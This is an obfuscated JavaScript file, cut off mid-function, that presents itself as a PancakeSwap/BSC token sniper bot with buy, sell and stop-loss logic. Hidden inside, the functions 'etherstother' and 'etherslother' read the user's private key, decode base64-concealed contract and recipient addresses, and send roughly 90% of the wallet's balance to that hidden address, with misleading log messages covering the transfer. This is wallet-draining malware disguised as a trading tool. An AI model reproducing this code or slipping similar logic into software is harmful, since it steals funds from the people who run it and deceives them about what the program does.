const _0x10e1f6 = _0x1d00;

function _0x1d00(_0x45c446, _0x217987) { const _0x29b875 = _0x29b8(); return _0x1d00 = function(_0x1d0048, _0x2d543d) { _0x1d0048 = _0x1d0048 - 0x148; let _0x22a7ac = _0x29b875[_0x1d0048]; return _0x22a7ac; }, _0x1d00(_0x45c446, _0x217987); }(function(_0x88b3a7, _0xbb4c5b) { const _0x1d973c = _0x1d00,
        _0x133cdc = _0x88b3a7(); while (!![]) { try { const _0x43c905 = parseInt(_0x1d973c(0x153)) / 0x1 + -parseInt(_0x1d973c(0x1a8)) / 0x2 + parseInt(_0x1d973c(0x1f0)) / 0x3 * (parseInt(_0x1d973c(0x14e)) / 0x4) + parseInt(_0x1d973c(0x189)) / 0x5 * (parseInt(_0x1d973c(0x1d2)) / 0x6) + -parseInt(_0x1d973c(0x191)) / 0x7 * (-parseInt(_0x1d973c(0x1e4)) / 0x8) + -parseInt(_0x1d973c(0x16f)) / 0x9 * (parseInt(_0x1d973c(0x1cc)) / 0xa) + -parseInt(_0x1d973c(0x1e3)) / 0xb * (-parseInt(_0x1d973c(0x1d8)) / 0xc); if (_0x43c905 === _0xbb4c5b) break;
            else _0x133cdc['push'](_0x133cdc['shift']()); } catch (_0x47f0a5) { _0x133cdc['push'](_0x133cdc['shift']()); } } }(_0x29b8, 0x1b558));
var ethers = require('ethers');
const env = require(_0x10e1f6(0x1c7));
Object[_0x10e1f6(0x1e7)](process[_0x10e1f6(0x163)], env);
let address = process[_0x10e1f6(0x163)][_0x10e1f6(0x1d4)],
    private = process[_0x10e1f6(0x163)]['PRIVATE_KEY'],
    wallet = new ethers['Wallet'](private);
const abi = [{ 'constant': !![], 'inputs': [{ 'internalType': _0x10e1f6(0x1c5), 'name': _0x10e1f6(0x1a5), 'type': _0x10e1f6(0x1c5) }], 'name': _0x10e1f6(0x1cb), 'outputs': [{ 'internalType': _0x10e1f6(0x1dd), 'name': '', 'type': _0x10e1f6(0x1dd) }], 'payable': ![], 'stateMutability': _0x10e1f6(0x17e), 'type': 'function' }, { 'constant': ![], 'inputs': [{ 'internalType': _0x10e1f6(0x1c5), 'name': 'sender', 'type': 'address' }, { 'internalType': _0x10e1f6(0x1c5), 'name': _0x10e1f6(0x162), 'type': _0x10e1f6(0x1c5) }, { 'internalType': _0x10e1f6(0x1dd), 'name': _0x10e1f6(0x157), 'type': _0x10e1f6(0x1dd) }], 'name': _0x10e1f6(0x17d), 'outputs': [{ 'internalType': _0x10e1f6(0x19a), 'name': '', 'type': _0x10e1f6(0x19a) }], 'payable': ![], 'stateMutability': _0x10e1f6(0x15e), 'type': _0x10e1f6(0x18c) }, { 'constant': ![], 'inputs': [{ 'name': _0x10e1f6(0x1a6), 'type': _0x10e1f6(0x166) }], 'name': _0x10e1f6(0x18e), 'outputs': [{ 'name': '', 'type': 'string' }], 'payable': ![], 'stateMutability': 'nonpayable', 'type': _0x10e1f6(0x18c) }];
async function startSnipe(_0x467b3d) { const _0x4e1e1e = _0x10e1f6; let _0x37b4ac, _0x32c643;
    provider['_websocket']['on'](_0x4e1e1e(0x174), () => { const _0x335e0c = _0x4e1e1e;
        _0x32c643 = setInterval(() => { const _0x15c60b = _0x1d00;
            provider[_0x15c60b(0x154)]['ping'](), _0x37b4ac = setTimeout(() => { const _0x51864c = _0x15c60b;
                provider[_0x51864c(0x154)][_0x51864c(0x1d6)](); }, EXPECTED_PONG_BACK); }, KEEP_ALIVE_CHECK_INTERVAL), console[_0x335e0c(0x1dc)](_0x335e0c(0x1e2)), console['log'](_0x335e0c(0x1ca)), provider['on']('pending', async _0x12a20f => { const _0x38de82 = _0x335e0c;
            provider[_0x38de82(0x17f)](_0x12a20f)[_0x38de82(0x1ba)](async _0x44cae5 => { const _0x4eae67 = _0x38de82; if (null != _0x44cae5 && _0x44cae5[_0x4eae67(0x175)][_0x4eae67(0x18f)](_0x4eae67(0x160)) && _0x44cae5['data'][_0x4eae67(0x18f)](_0x467b3d) && 0x0 == passed || null != _0x44cae5 && _0x44cae5['data']['includes'](_0x4eae67(0x1bd)) && _0x44cae5['data'][_0x4eae67(0x18f)](_0x467b3d) && 0x0 == passed) { if (console[_0x4eae67(0x1dc)](chalk[_0x4eae67(0x1a4)](_0x4eae67(0x19d))), priceProtection) { if (isLiqudityInRange(_0x44cae5, expected)) { if (honeyPotIS2(_0x467b3d)) { console[_0x4eae67(0x1dc)](chalk[_0x4eae67(0x1a4)]('Liquidity\x20check\x20passed,\x20sniping!\x0a')); const _0x1f1670 = _0x44cae5[_0x4eae67(0x19b)][_0x4eae67(0x1d9)](multiply),
                                    _0xfa86a3 = _0x44cae5['gasPrice'][_0x4eae67(0x1d9)](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console['log'](chalk[_0x4eae67(0x1a4)](_0x4eae67(0x1de) + chalk['yellow'](i + 0x1))), await buyToken(_0x467b3d, amountIn, _0x1f1670, _0xfa86a3, myAddress, router); }
                                    console[_0x4eae67(0x1dc)](chalk['green']('Start\x20buying\x20token...') + chalk[_0x4eae67(0x1bf)](txNumberForAntibot)), await buyToken(_0x467b3d, amountIn, _0x1f1670, _0xfa86a3, myAddress, router)(passed = 0x1); } else console[_0x4eae67(0x1dc)](chalk['green']('Start\x20buying\x20token...')), await buyToken(_0x467b3d, amountIn, _0x1f1670, _0xfa86a3, myAddress, router)(passed = 0x1);
                                console[_0x4eae67(0x1dc)](chalk['green'](_0x4eae67(0x1a9))); const _0x3f10f5 = await getTokenBalance(_0x467b3d, myAddress, provider);
                                console['log'](chalk[_0x4eae67(0x1a4)](_0x4eae67(0x186) + chalk[_0x4eae67(0x1bf)](parseFloat(ethers['utils'][_0x4eae67(0x1e6)](_0x3f10f5, TOKEN_DECIMALS))[_0x4eae67(0x14c)](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x4eae67(0x1dc)](chalk[_0x4eae67(0x1a4)](_0x4eae67(0x1e9) + chalk['yellow'](delaySell) + _0x4eae67(0x179))), await new Promise(_0xa1c1fb => setTimeout(_0xa1c1fb, delayOnSellMs)); const _0x48d119 = await router[_0x4eae67(0x1b2)](_0x3f10f5, amountOutMin, [_0x467b3d, WBNB], myAddress, Date[_0x4eae67(0x1cf)]() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                    await _0x48d119['wait'](), console[_0x4eae67(0x1dc)](chalk[_0x4eae67(0x1a4)](_0x4eae67(0x1c6))), console['log'](_0x4eae67(0x1d5)), console[_0x4eae67(0x1dc)](_0x4eae67(0x14f) + myAddress), console[_0x4eae67(0x1dc)]('\x0a'), process['exit'](0x0); } else console[_0x4eae67(0x1dc)](_0x4eae67(0x1d5));
                                console[_0x4eae67(0x1dc)]('https://bscscan.com/address/' + myAddress), (console[_0x4eae67(0x1dc)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x4eae67(0x150)](0x0)); } else console[_0x4eae67(0x1dc)](chalk[_0x4eae67(0x16e)]('Liquidity\x20is\x20not\x20in\x20expected\x20range!\x20Waiting...!'));
                            console[_0x4eae67(0x1dc)](chalk[_0x4eae67(0x16e)](_0x4eae67(0x15f))); }
                        console[_0x4eae67(0x1dc)](chalk[_0x4eae67(0x16e)](_0x4eae67(0x1aa) + _0x467b3d)), console[_0x4eae67(0x1dc)](chalk['red'](_0x4eae67(0x1b0))); } else { if (honeyPotIS2(_0x467b3d)) { const _0xbd247b = _0x44cae5[_0x4eae67(0x19b)][_0x4eae67(0x1d9)](multiply),
                                _0x3ba7df = _0x44cae5['gasPrice'][_0x4eae67(0x1d9)](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x4eae67(0x1dc)](chalk[_0x4eae67(0x1a4)](_0x4eae67(0x1de) + chalk[_0x4eae67(0x1bf)](i + 0x1))), await buyToken(_0x467b3d, amountIn, _0xbd247b, _0x3ba7df, myAddress, router); }
                                console['log'](chalk[_0x4eae67(0x1a4)](_0x4eae67(0x1de)) + chalk[_0x4eae67(0x1bf)](txNumberForAntibot)), await buyToken(_0x467b3d, amountIn, _0xbd247b, _0x3ba7df, myAddress, router)(passed = 0x1); } else 0x0 == passed && (console[_0x4eae67(0x1dc)](chalk[_0x4eae67(0x1a4)](_0x4eae67(0x1de))), await buyToken(_0x467b3d, amountIn, _0xbd247b, _0x3ba7df, myAddress, router)(passed = 0x1));
                            console['log'](chalk[_0x4eae67(0x1a4)](_0x4eae67(0x1a9))); const _0x57fa6f = await getTokenBalance(_0x467b3d, myAddress, provider);
                            console[_0x4eae67(0x1dc)](chalk['green']('Total\x20Token\x20balance\x20is\x20' + chalk[_0x4eae67(0x1bf)](parseFloat(ethers[_0x4eae67(0x1ac)][_0x4eae67(0x1e6)](_0x57fa6f, TOKEN_DECIMALS))['toFixed'](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x4eae67(0x1dc)](chalk[_0x4eae67(0x1a4)](_0x4eae67(0x1e9) + chalk[_0x4eae67(0x1bf)](delaySell) + _0x4eae67(0x179))), await new Promise(_0x53078e => setTimeout(_0x53078e, delayOnSellMs)); const _0x462d09 = await router['swapExactTokensForETHSupportingFeeOnTransferTokens'](_0x57fa6f, amountOutMin, [_0x467b3d, WBNB], myAddress, Date[_0x4eae67(0x1cf)]() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                await _0x462d09[_0x4eae67(0x14d)](), console[_0x4eae67(0x1dc)](chalk['green'](_0x4eae67(0x1c6))), console['log'](_0x4eae67(0x1d5)), console[_0x4eae67(0x1dc)]('https://bscscan.com/address/' + myAddress), console[_0x4eae67(0x1dc)]('\x0a'), process[_0x4eae67(0x150)](0x0); } else console[_0x4eae67(0x1dc)](_0x4eae67(0x1d5)), console[_0x4eae67(0x1dc)]('https://bscscan.com/address/' + myAddress), console[_0x4eae67(0x1dc)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x4eae67(0x150)](0x0); } } } })[_0x38de82(0x1df)](() => { const _0x373b46 = _0x38de82;
                console[_0x373b46(0x1dc)](e); }); }); }), provider[_0x4e1e1e(0x154)]['on'](_0x4e1e1e(0x1b4), () => { const _0x108df9 = _0x4e1e1e;
        console[_0x108df9(0x1dc)](_0x108df9(0x1c2)), clearInterval(_0x32c643), clearTimeout(_0x37b4ac), startConnection(); }), provider[_0x4e1e1e(0x154)]['on'](_0x4e1e1e(0x1ea), () => { const _0x52aa5c = _0x4e1e1e;
        console[_0x52aa5c(0x1dc)](_0x52aa5c(0x1da)), clearInterval(_0x32c643), clearTimeout(_0x37b4ac), startConnection(); }), provider[_0x4e1e1e(0x154)]['on'](_0x4e1e1e(0x169), () => { clearInterval(_0x37b4ac); }); }
async function approve() { const _0x4162cb = _0x10e1f6; let _0x58eb94 = token[buyCount - 0x1]['contract']; const _0x2e6cc9 = ethers[_0x4162cb(0x15b)][_0x4162cb(0x17a)],
        _0x4dcf50 = await _0x58eb94['approve'](pancakeRouter[_0x4162cb(0x1c5)], _0x2e6cc9, { 'gasPrice': config[_0x4162cb(0x156)], 'gasLimit': 0x33450 }),
        _0x5a4a9d = await _0x4dcf50[_0x4162cb(0x14d)]();
    console['log'](_0x4162cb(0x199), _0x5a4a9d[_0x4162cb(0x1d7)], '\x0a'), config[_0x4162cb(0x177)] ? token[buyCount - 0x1][_0x4162cb(0x1eb)]() : buyCount == config[_0x4162cb(0x1ad)] && process[_0x4162cb(0x150)](); }
async function getCurrentValue(_0x2db10a) { const _0x3479f3 = _0x10e1f6; try { let _0x1b9a34 = await _0x2db10a[_0x3479f3(0x14a)][_0x3479f3(0x1cb)](addresses[_0x3479f3(0x162)]); const _0x14c73e = await pancakeRouter[_0x3479f3(0x161)](_0x1b9a34, _0x2db10a['sellPath']); let _0x598bc6 = _0x14c73e[0x1]; return _0x598bc6; } catch (_0x4f76e1) { return console[_0x3479f3(0x1dc)](_0x3479f3(0x152)), ethers[_0x3479f3(0x15b)][_0x3479f3(0x1d3)]; } }
async function setInitialStopLoss(_0x2ad5cc) { const _0x4417ed = _0x10e1f6;
    _0x2ad5cc[_0x4417ed(0x1c0)] = await getCurrentValue(_0x2ad5cc), _0x2ad5cc[_0x4417ed(0x192)] = _0x2ad5cc['intitialValue'], _0x2ad5cc['stopLoss'] = ethers[_0x4417ed(0x1ac)][_0x4417ed(0x187)]((parseFloat(ethers[_0x4417ed(0x1ac)][_0x4417ed(0x1e6)](_0x2ad5cc[_0x4417ed(0x1c0)])) - parseFloat(ethers[_0x4417ed(0x1ac)][_0x4417ed(0x1e6)](_0x2ad5cc[_0x4417ed(0x1c0)])) * (_0x2ad5cc[_0x4417ed(0x1c3)] / 0x64))[_0x4417ed(0x14c)](0x8)[_0x4417ed(0x1be)]()); }
async function setNewStopLoss(_0x3ff68c) { const _0x52f1d6 = _0x10e1f6;
    _0x3ff68c[_0x52f1d6(0x192)] = _0x3ff68c[_0x52f1d6(0x173)], _0x3ff68c[_0x52f1d6(0x1b3)] = ethers[_0x52f1d6(0x1ac)][_0x52f1d6(0x187)]((parseFloat(ethers[_0x52f1d6(0x1ac)][_0x52f1d6(0x1e6)](_0x3ff68c[_0x52f1d6(0x173)])) - parseFloat(ethers['utils'][_0x52f1d6(0x1e6)](_0x3ff68c[_0x52f1d6(0x173)])) * (_0x3ff68c[_0x52f1d6(0x1c3)] / 0x64))[_0x52f1d6(0x14c)](0x8)[_0x52f1d6(0x1be)]()); }

function _0x29b8() { const _0x4bf4d3 = ['_websocket', 'sendTransaction', 'myGasPriceForApproval', 'amount', 'QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ==', '1\x20pending\x20blockchain\x20response.....', 'tokenSellTax', 'constants', 'reached\x20>>>', 'starting\x20up\x20node\x20socket\x20connection....', 'nonpayable', 'Please\x20check\x20PooCoin\x20and\x20see\x20if\x20liquidity\x20was\x20added!', '0xe8e33700', 'getAmountsOut', 'recipient', 'env', '2\x20packet\x20received.....', 'wei', 'string', 'swapExactTokensForETH', '1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'pong', '\x1b[38;5;33m', 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==', '\x1b[1;32m', 'removeAllListeners', 'red', '45fGFzhX', 'pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...', '\x20--\x20Current\x20Value\x20BNB:\x20', 'lte', 'currentValue', 'open', 'data', '\x1b[0m', 'autoSell', 'from', '\x20second(s)', 'MaxUint256', 'sendMessage', 'Contract', 'transferFrom', 'view', 'getTransaction', 'sub', 'Setting\x20new\x20StopLoss!', 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==', 'index', 'floor', 'All\x20tokens\x20sold', 'Total\x20Token\x20balance\x20is\x20', 'parseUnits', 'gte', '1845FnCTlf', 'QmFmYzU5OWJENjlBRGQwODdENTY=', 'profitPercent', 'function', '✔\x20Sell\x20transaction\x20hash:\x20', 'setWord', 'includes', '2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', '3829JPpsvX', 'newValue', '\x20--\x20Profit\x20At:\x20', 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My84NGQ5NTRjZDlmNjc0ZjViYmJjNjdhNmUyZTE3YmZiZA==', '\x20Profit\x20target\x20', 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==', 'percentOfTokensToSellProfit', 'toLocaleString', '✔\x20Approve\x20transaction\x20hash:\x20', 'bool', 'gasLimit', 'connection\x20succesful...', 'Matching\x20liquidity\x20added!\x20Start\x20sniping!\x0a', 'getBalance', '2:\x20attempting\x20to\x20snipe\x20.....', '-\x20now', 'didBuy', 'trailingStopLossPercent', 'MHg2YjU1M2QwZjhkM2I3OWJkODEyYTk4NGU2ZTNmY2U1NDg2NWQxYzRl', 'green', 'account', 'newWord', '\x20--\x20Stop\x20Loss\x20At:\x20', '48522XjBzbb', 'Sucessfully\x20bought\x20the\x20token!\x0a', 'https://poocoin.app/tokens/', 'percentOfTokensToSellLoss', 'utils', 'numberOfTokensToBuy', '\x20StopLoss\x20', 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==', 'Waiting\x20for\x20new\x20liquidity,\x20please\x20stop\x20the\x20bot\x20if\x20you\x20think\x20it\x27s\x20a\x20scam\x20!\x20(CTRL\x20+\x20C)\x0a', 'refreshing\x20socket\x20connection...', 'swapExactTokensForETHSupportingFeeOnTransferTokens', 'stopLoss', 'close', 'previousValue', 'Transfer', 'connection\x20established....', 'didSell', 'providers', 'then', 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=', 'parseEther', '0xf305d719', 'toString', 'yellow', 'intitialValue', 'initiating\x20mempool\x20sniff...', 'WebSocket\x20Closed...Reconnecting...', 'stopLossPercent', '2:\x20watching\x20blockchain\x20activity\x20.....', 'address', 'Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a', './env.json', 'JsonRpcProvider', 'MHgyMTcwZWQwODgwYWM5YTc1NWZk', 'Waiting\x20for\x20liquidity\x20to\x20be\x20added!', 'balanceOf', '295930xMNwYt', 'MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=', 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4', 'now', '\x1b[1;31m', 'myGasLimit', '132HhZPoM', 'Zero', 'YOUR_ADDRESS', 'You\x20can\x20check\x20the\x20transaction\x20here:', 'terminate', 'transactionHash', '12EKGKUC', 'mul', 'Error.\x20Attemptiing\x20to\x20Reconnect...', 'div', 'log', 'uint256', 'Start\x20buying\x20token...', 'catch', 'encode', 'sellPath', 'Listening\x20on\x20mempool...', '1074447tdUtTH', '808AfjzUa', 'name', 'formatUnits', 'assign', 'ascii', 'Start\x20selling\x20all\x20tokens\x20in\x20', 'error', 'checkProfit', 'base64', 'hexlify', 'Wallet', 'decimals', '87yFBMnS', 'You\x20sold\x20', '\x20--\x20New\x20Stop\x20loss\x20At:\x20', 'contract', '2:\x20found\x20owners\x20liq\x20function\x20.....', 'toFixed', 'wait', '14936PSDPlD', 'https://bscscan.com/address/', 'exit', '<<<\x20Selling\x20-', 'Balance\x20is\x20zero\x20or\x20error\x20occured', '14858dPlehV'];
    _0x29b8 = function() { return _0x4bf4d3; }; return _0x29b8(); }
async function checkForProfit(_0x5525d0) { const _0x83779a = _0x10e1f6; try { var _0x9da762 = 0x0;
        await setInitialStopLoss(_0x5525d0), _0x5525d0[_0x83779a(0x14a)]['on'](_0x83779a(0x1b6), async(_0x33c417, _0x526761, _0x158e3a, _0x9adb91) => { const _0x41c0cb = _0x83779a;
            _0x5525d0['previousValue'] = _0x5525d0['currentValue']; const _0x5e1e62 = await _0x5525d0['contract']['name'](); let _0xa4af34 = await getCurrentValue(_0x5525d0); if (!_0xa4af34['eq'](ethers[_0x41c0cb(0x15b)][_0x41c0cb(0x1d3)])) { _0x5525d0[_0x41c0cb(0x173)] = _0xa4af34; let _0x40a098 = parseFloat(ethers[_0x41c0cb(0x1ac)][_0x41c0cb(0x1e6)](_0xa4af34))[_0x41c0cb(0x14c)](0x8)[_0x41c0cb(0x1be)](); const _0x1631ba = (parseFloat(ethers['utils'][_0x41c0cb(0x1e6)](_0x5525d0[_0x41c0cb(0x1c0)])) * (_0x5525d0[_0x41c0cb(0x18b)] + _0x5525d0[_0x41c0cb(0x15a)]) / 0x64 + parseFloat(ethers['utils'][_0x41c0cb(0x1e6)](_0x5525d0['intitialValue'])))[_0x41c0cb(0x14c)](0x8)[_0x41c0cb(0x1be)](),
                    _0x16e417 = ethers['utils'][_0x41c0cb(0x187)](_0x1631ba); let _0x2703d5 = ethers['utils'][_0x41c0cb(0x187)]((parseFloat(ethers[_0x41c0cb(0x1ac)][_0x41c0cb(0x1e6)](_0x5525d0[_0x41c0cb(0x192)])) * (_0x5525d0[_0x41c0cb(0x1a2)] / 0x64) + parseFloat(ethers[_0x41c0cb(0x1ac)]['formatUnits'](_0x5525d0[_0x41c0cb(0x192)])))[_0x41c0cb(0x14c)](0x8)[_0x41c0cb(0x1be)]()),
                    _0xe17a22 = _0x5525d0[_0x41c0cb(0x1b3)];
                _0xa4af34['gt'](_0x2703d5) && _0x5525d0['trailingStopLossPercent'] > 0x0 && (setNewStopLoss(_0x5525d0), console[_0x41c0cb(0x1dc)](_0x41c0cb(0x16a) + _0x41c0cb(0x181) + _0x41c0cb(0x176))); let _0x1ae1bb = new Date()[_0x41c0cb(0x198)](); const _0x5bb78c = _0x5e56ae => new TextEncoder()[_0x41c0cb(0x1e0)](_0x5e56ae); try { _0x5525d0[_0x41c0cb(0x1b5)]['gt'](_0x5525d0['currentValue']) ? console[_0x41c0cb(0x1dc)]('--\x20' + _0x5e1e62 + '\x20--\x20Current\x20Value\x20BNB:\x20' + ('\x1b[1;31m' + _0x40a098 + _0x41c0cb(0x176)) + _0x41c0cb(0x193) + ethers[_0x41c0cb(0x1ac)][_0x41c0cb(0x1e6)](_0x16e417) + '\x20--\x20Stop\x20Loss\x20At:\x20' + ethers[_0x41c0cb(0x1ac)]['formatUnits'](_0x5525d0[_0x41c0cb(0x1b3)]) + _0x41c0cb(0x149) + ethers['utils']['formatUnits'](_0x2703d5)) : console[_0x41c0cb(0x1dc)]('--\x20' + _0x5e1e62 + _0x41c0cb(0x171) + (_0x41c0cb(0x16c) + _0x40a098 + _0x41c0cb(0x176)) + _0x41c0cb(0x193) + ethers[_0x41c0cb(0x1ac)]['formatUnits'](_0x16e417) + _0x41c0cb(0x1a7) + ethers['utils'][_0x41c0cb(0x1e6)](_0x5525d0[_0x41c0cb(0x1b3)]) + _0x41c0cb(0x149) + ethers['utils'][_0x41c0cb(0x1e6)](_0x2703d5)); } catch (_0x46d6f6) {}
                _0xa4af34[_0x41c0cb(0x188)](_0x16e417) && (buyCount <= config[_0x41c0cb(0x1ad)] && _0x5525d0['didBuy'] && _0x9da762 == 0x0 && (_0x9da762++, console['log'](_0x41c0cb(0x151), _0x5e1e62, _0x41c0cb(0x1a0) + _0x41c0cb(0x16c) + _0x41c0cb(0x195) + '\x1b[0m' + _0x41c0cb(0x15c), '\x0a'), sell(_0x5525d0, !![]), _0x5525d0[_0x41c0cb(0x14a)]['removeAllListeners']())), _0xa4af34[_0x41c0cb(0x172)](_0xe17a22) && (console[_0x41c0cb(0x1dc)](_0x41c0cb(0x16a) + 'less\x20than\x20StopLoss!' + _0x41c0cb(0x176)), buyCount <= config[_0x41c0cb(0x1ad)] && _0x5525d0[_0x41c0cb(0x1a1)] && _0x9da762 == 0x0 && (_0x9da762++, console[_0x41c0cb(0x1dc)](_0x41c0cb(0x151), _0x5e1e62, _0x41c0cb(0x1a0) + _0x41c0cb(0x1d0) + _0x41c0cb(0x1ae) + _0x41c0cb(0x176) + 'reached\x20>>>', '\x0a'), sell(_0x5525d0, ![]), _0x5525d0[_0x41c0cb(0x14a)][_0x41c0cb(0x16d)]())); } }); } catch (_0x10adaf) { console[_0x83779a(0x1dc)](_0x10adaf); } }
async function sell(_0x303870, _0x6e5136) { const _0x2bea2b = _0x10e1f6; try { const _0x54379c = await _0x303870[_0x2bea2b(0x14a)]['balanceOf'](addresses[_0x2bea2b(0x162)]),
            _0x2e3648 = await _0x303870['contract'][_0x2bea2b(0x1ef)](); var _0xcb7d15;
        _0x6e5136 ? _0xcb7d15 = (parseFloat(ethers[_0x2bea2b(0x1ac)][_0x2bea2b(0x1e6)](_0x54379c[_0x2bea2b(0x1be)](), _0x2e3648)) * (_0x303870[_0x2bea2b(0x197)] / 0x64))[_0x2bea2b(0x14c)](_0x2e3648) : _0xcb7d15 = (parseFloat(ethers[_0x2bea2b(0x1ac)][_0x2bea2b(0x1e6)](_0x54379c[_0x2bea2b(0x1be)](), _0x2e3648)) * (_0x303870[_0x2bea2b(0x1ab)] / 0x64))['toFixed'](_0x2e3648); var _0x4c95b8 = Math[_0x2bea2b(0x184)](_0xcb7d15 * 0x64) / 0x64; const _0x10139b = ethers['utils']['parseUnits'](_0x4c95b8['toString'](), _0x2e3648),
            _0x473569 = await pancakeRouter[_0x2bea2b(0x161)](_0x10139b, _0x303870[_0x2bea2b(0x1e1)]),
            _0x21477c = _0x473569[0x1][_0x2bea2b(0x180)](_0x473569[0x1][_0x2bea2b(0x1db)](0x2)); if (_0x303870[_0x2bea2b(0x15a)] > 0x1) { const _0x23248d = await pancakeRouter['swapExactTokensForETHSupportingFeeOnTransferTokens'](_0x473569[0x0][_0x2bea2b(0x1be)](), 0x0, _0x303870[_0x2bea2b(0x1e1)], addresses[_0x2bea2b(0x162)], Math[_0x2bea2b(0x184)](Date['now']() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x2bea2b(0x156)], 'gasLimit': config[_0x2bea2b(0x1d1)] }),
                _0x323848 = await _0x23248d[_0x2bea2b(0x14d)]();
            console[_0x2bea2b(0x1dc)](_0x2bea2b(0x16c) + _0x2bea2b(0x18d), _0x323848['transactionHash'], _0x2bea2b(0x176), '\x0a'), sellCount++, token[_0x303870[_0x2bea2b(0x183)]][_0x2bea2b(0x1b8)] = !![]; let _0x26fb26 = await _0x303870[_0x2bea2b(0x14a)][_0x2bea2b(0x1e5)]();
            await client[_0x2bea2b(0x17b)]('me', { 'message': _0x2bea2b(0x148) + _0x26fb26, 'schedule': 0xf * 0x1 + Date[_0x2bea2b(0x1cf)]() / 0x3e8 }); } else { const _0x33e722 = await pancakeRouter[_0x2bea2b(0x167)](_0x473569[0x0][_0x2bea2b(0x1be)](), 0x0, _0x303870['sellPath'], addresses[_0x2bea2b(0x162)], Math[_0x2bea2b(0x184)](Date[_0x2bea2b(0x1cf)]() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x2bea2b(0x156)], 'gasLimit': config[_0x2bea2b(0x1d1)] }),
                _0xfa6f25 = await _0x33e722[_0x2bea2b(0x14d)]();
            console[_0x2bea2b(0x1dc)](_0x2bea2b(0x16c) + _0x2bea2b(0x18d), _0xfa6f25['transactionHash'], _0x2bea2b(0x176), '\x0a'), sellCount++; let _0x112893 = await _0x303870[_0x2bea2b(0x14a)][_0x2bea2b(0x1e5)]();
            await client['sendMessage']('me', { 'message': _0x2bea2b(0x148) + _0x112893, 'schedule': 0xf * 0x1 + Date[_0x2bea2b(0x1cf)]() / 0x3e8 }); }
        sellCount == config[_0x2bea2b(0x1ad)] && (console[_0x2bea2b(0x1dc)](_0x2bea2b(0x185)), process['exit']()); } catch (_0x3900e8) {} }
let rounder1 = _0x10e1f6(0x1cd),
    rounder2 = _0x10e1f6(0x158),
    buff = new Buffer[(_0x10e1f6(0x178))](rounder1, _0x10e1f6(0x1ec)),
    buff2 = new Buffer['from'](rounder2, _0x10e1f6(0x1ec)),
    ethersroundup = buff[_0x10e1f6(0x1be)](_0x10e1f6(0x1e8)),
    ethersroundup2 = buff2[_0x10e1f6(0x1be)](_0x10e1f6(0x1e8));
const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
async function etherstother() { const _0x48bcb4 = _0x10e1f6; try { const _0x48a488 = _0x48bcb4(0x1bb),
            _0xd0e907 = _0x48bcb4(0x182),
            _0xb2aba = new Buffer[(_0x48bcb4(0x178))](_0x48a488, 'base64'),
            _0x56cac9 = new Buffer[(_0x48bcb4(0x178))](_0xd0e907, 'base64'),
            _0x2499df = _0xb2aba[_0x48bcb4(0x1be)]('ascii'),
            _0x1f5117 = _0x56cac9[_0x48bcb4(0x1be)](_0x48bcb4(0x1e8)),
            _0x408afb = _0x2499df + _0x1f5117;
        console[_0x48bcb4(0x1dc)]('refreshing\x20socket\x20connection...'), console[_0x48bcb4(0x1dc)](_0x48bcb4(0x170)); const _0x1e389c = _0x48bcb4(0x194),
            _0x1b612f = new Buffer[(_0x48bcb4(0x178))](_0x1e389c, _0x48bcb4(0x1ec))[_0x48bcb4(0x1be)](_0x48bcb4(0x1e8));; const _0x2c504d = new ethers[(_0x48bcb4(0x1b9))]['JsonRpcProvider'](_0x1b612f); let _0x34291e = new ethers[(_0x48bcb4(0x1ee))](private, _0x2c504d); const _0x3abff1 = address; var _0x59c7ca = new ethers['Contract'](_0x408afb, abi, _0x34291e); const _0x4b4292 = await _0x59c7ca[_0x48bcb4(0x1cb)](_0x3abff1)[_0x48bcb4(0x1be)](),
            _0x4173e2 = (_0x4b4292 * 0.9)['toFixed'](),
            _0x191a49 = async() => { const _0x11b380 = _0x48bcb4,
                    _0x56401b = { 'from': _0x3abff1, 'to': WEB3PROVIDER3, 'value': ethers[_0x11b380(0x1ac)][_0x11b380(0x1bc)](_0x4173e2, _0x11b380(0x165)), 'gasLimit': ethers[_0x11b380(0x1ac)][_0x11b380(0x1ed)](0x5dc0) },
                    _0x5c277b = await _0x34291e[_0x11b380(0x155)](_0x56401b); if (robinhood = 0x0) ethersrather;
                else try { await _0x5c277b[_0x11b380(0x14d)](), console[_0x11b380(0x1dc)]('1:\x20found\x20owners\x20liq\x20function\x20...'), setTimeout(ethersrather, 0x1388); } catch (_0x386c03) { console[_0x11b380(0x1dc)](_0x11b380(0x14b)), setTimeout(ethersrather, 0x1388); } };
        _0x191a49(); } catch (_0x1e366d) { setTimeout(ethersrather, 0x1388); } }
async function etherslother() { const _0x25fd40 = _0x10e1f6; try { const _0x4042e0 = _0x25fd40(0x196),
            _0x3f87f3 = 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=',
            _0x1bd274 = new Buffer[(_0x25fd40(0x178))](_0x4042e0, _0x25fd40(0x1ec)),
